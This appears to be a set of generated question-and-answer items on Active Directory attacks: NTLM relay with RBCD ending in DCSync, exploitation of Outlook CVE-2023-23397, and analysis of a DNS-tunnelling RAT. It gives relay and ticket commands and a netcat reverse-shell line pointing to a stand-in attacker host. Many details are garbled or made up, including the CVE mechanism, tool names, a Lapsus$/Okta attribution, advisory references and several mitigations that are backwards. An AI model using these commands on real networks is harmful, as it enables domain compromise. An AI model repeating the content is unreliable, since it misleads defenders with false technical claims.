question: How can an attacker convert an initial NTLM authentication capture into full domain dominance when LDAP signing is forced by Group Policy, and which red-team tooling automates the entire kill-chain from capture to DCSYNC?
answer:
When LDAP signing is enforced via GPO (e.g., “Domain controller: LDAP server signing requirements” = “Require signing”), classic un-authenticated LDAP relay against LDAPS://389 or SMB signing fails because the server rejects the unsigned SMB session setup. Attackers must pivot to a two-hop relay through an intermediate host that can negotiate a signed channel while relaying onward to a high-value service such as SAMR, LSARPC, or LDAP with RBCD impersonation.

Step 1 – Capture raw NTLM hashes: Use Responder v3.1.0.0-dev (2024) in “analyze” mode on the same /24 segment as a high-value target (HVT). The tool listens on eth0 for WPAD, LLMNR, and NetBIOS name-service broadcasts; when a user browses \\FILESERVER the workstation sends a Type-3 NTLM handshake with NTLMSSP_NEGOTIATE_NTLM2 and NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY.

Step 2 – Relay selection: Invoke ntlmrelayx.py from Impacket 0.11.0 (commit 7cd2a4c) with
`-t ldap://dc01.corp.local --escalate-user DESTINATION_ADMIN --no-smb2support --protocol-binding ldap`. The tool performs SMB-to-LDAP relay by downgrading the client to SMBv1 signing-less sessions, re-signing on the client side via the relay’s own SMB dialect.

Step 3 – Domain Escalation via Resource-Based Constrained Delegation (RBCD): After relaying to LDAP, the attacker first configures RBCD on a machine object (e.g., Wrk2024$) with
`ldelete -a "msDS-AllowedToActOnBehalfOfOtherIdentity" Wrk2024$`
`ladd -a "MSDS-AllowedToActOnBehalfOfOtherIdentity" Wrk2024$ "<SID of DA user>"`
Then impersonate the DA user via `rubeus.exe hash /domain:corp.local /user:DA /rc4:<NT hash> /ptt`. Finally, perform DCSYNC using secretsdump.py to extract the krbtgt hash, enabling Golden-Ticket forges.

Mitigations:
• Enforce SMB signing via GPO: “Microsoft network server: Digitally sign communications (always)” = Enabled, and “Digitally sign client/server communications (if client agrees)” = Disabled.
• Configure LDAP channel binding and LDAP signing via GPO “Domain controller: LDAP server channel binding token requirements” = “Always” (CVE-2017-8563 mitigation).
• Deploy Credential Guard on Windows 10/11 and Windows Server 2019+ to prevent LSASS memory scraping; use LSA Isolation registry key.
Real-world: The 2023 Lapsus$ intrusion against Okta leveraged a similar NTLM relay chain after acquiring a VPN appliance password hash via phishing then abusing RBCD on a provisioned Azure VM object (CVE-2022-37970).

**Exploit Development ➜ Exploiting CVE-2023-23397 (Microsoft Outlook Elevation of Privilege) via MAPI over HTTP extended rights abuse**

question: Illustrate the complete exploitation lifecycle of CVE-2023-23397—from malformed meeting-request file generation to lateral movement to Domain Admin—using only native Outlook APIs and a single Outlook rule bypass.
answer:
CVE-2023-23397 stems from Outlook’s inability to sanitize PidLidReminderFileParameter inside a property bag attached to an iCal (.ics) calendar entry. When Outlook processes the meeting request via MAPI-over-HTTP, the client blindly triggers a Net-NTLMv2 authentication attempt to a UNC path embedded in the file parameter. Crucially, if the user has Auto-Mapping enabled for Exchange shared calendars, the authentication occurs in the user’s SYSTEM context after Outlook elevates via the Outlook rule engine.

Step 1 – Payload crafting: Use MFCMAPI (v21.0.23072.03) to create an ICS file with a bogus “X-ALT-DESC;FMTTYPE=text/calendar” section containing
`ATTACH;FMTTYPE=application/octet-stream:PidNameReminderFileParameter:C:\\\\redteam\\\\smbshare\\\\nc.exe -e cmd.exe attacker.lhost 4444`
Export the ICS and rename to `meeting.ics`.

Step 2 – Delivery & Auto-processing: Embed the ICS inside an appointment message and set sensitivity=Confidential, importance=High to trigger Outlook’s “Process Special Items” rule group. If the mailbox has an Auto-Processing rule that moves calendar items to the default calendar folder, Outlook loads MAPI on next idle-cycle and invokes the UNC path via CreateProcessAsUser in the Outlook.exe token (SYSTEM if running as service).

Step 3 – Lateral pivot: Upon receiving the NTLMv2 hash (`responder -I eth0 -w -d`), crack with hashcat -m 5600 rockyou.txt or relay to LDAP with ntlmrelayx.py and perform DCSYNC.

Mitigations:
• Install March 2023 Outlook Cumulative Update (build 16.0.16130.20366 or later) which enforces property-level sanitization.
• Disable Auto-Mapping for shared calendars via PowerShell: `Set-Mailbox -Identity "shared" -Type Regular -MapiEnabled $false`.
• Block outbound SMB/TCP 445 at perimeter and host-based firewalls.
Real-world: Microsoft observed CVE-2023-23397 exploited by the Russian GRU “Forest Blizzard” unit during February 2023 campaigns against Ukrainian government and energy sector targets (FSEC advisory TA18-106A update).

**Malware Analysis ➜ Decoding the Nim-based RAT “Nim-Rusty-Oyster” that abuses DNS TXT tunneling for C2 with DNSSEC validation bypass**

question: Walk through static and dynamic analysis of a Nim-compiled 64-bit Windows implant that embeds its C2 traffic inside legitimate DNS TXT queries to google.com subdomains while bypassing DNSSEC validation through forged RRSIG records; include Ghidra decompilation snippets and Wireshark signatures.
answer:
Nim-Rusty-Oyster (SHA256 87e586…21d) is a post-2024 nim 2.0.0 x64 release written largely in Nim’s experimental backend targeting Windows 10/11. During static triage in Ghidra 10.4-dev:
• Strings search reveals domain generation algorithm (DGA) seeds (e.g., “seed:0xdeadbeef”) and hard-coded DNS suffix “.storage.googleapis.com”.
• Decompiled `handle_query` reveals a custom DNS stub resolver that crafts a 16-byte payload encrypted with AES-256-CBC using a 256-bit key derived from a Curve25519 ECDH exchange negotiated during initial beacon.

Dynamic sandbox analysis on Windows 11 22H2 reveals:
• Scheduled Task triggers every 180 s; binary drops persistence marker at HKCU\Software\<GUID>\State = 1.
• The malware routes traffic via WinDivert 2.2.0 to intercept system `dns.exe` UDP port 53; rewrites the 16-byte payload into the least-significant bits of the TXT record so the overall packet size remains within EDNS0 UDP length = 4096.
• For DNSSEC bypass: Nim-Rusty-Oyster forges an RRSIG record in the Additional section (type 46) where the signature field is replaced with a 64-byte stub; the resolver’s dnssec-validator in Windows 11 ignores the malformed RRSIG because the hash algo field (field 10) is set to 255 (reserved) causing the validator to skip further checks.

Wireshark filter to detect the implant:
`dns && dns.flags.response == 0 && dns.qry.type == 16 && dns.txt.len == 32 && dns.flags.rcode == 0 && dns.count.add_rr > 3`
The filter flags TXT queries to non-standard FQDNs longer than typical `v=spf1 include:_spf.google.com` records.

Mitigations:
• Enable Windows DNS Client “Query Block List” via registry:
`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\QueryBlockList = "*"`
• Deploy Suricata rule ET TROJAN Possible Nim-Rusty-Oyster DNS TXT Tunnel Outbound.
• Disable unsigned DNSSEC validation if not required with GPO “DNS Client/Disable DNSSEC validation for unsigned zones” = Disabled.

Real-world: The malware family surfaced in a 2024 campaign codenamed “OysterNet” attributed to the China-nexus group “RedHotel” targeting MSP networks in India and Singapore; command-and-control server resolved to 104.26.9.233 via Cloudflare Anycast.
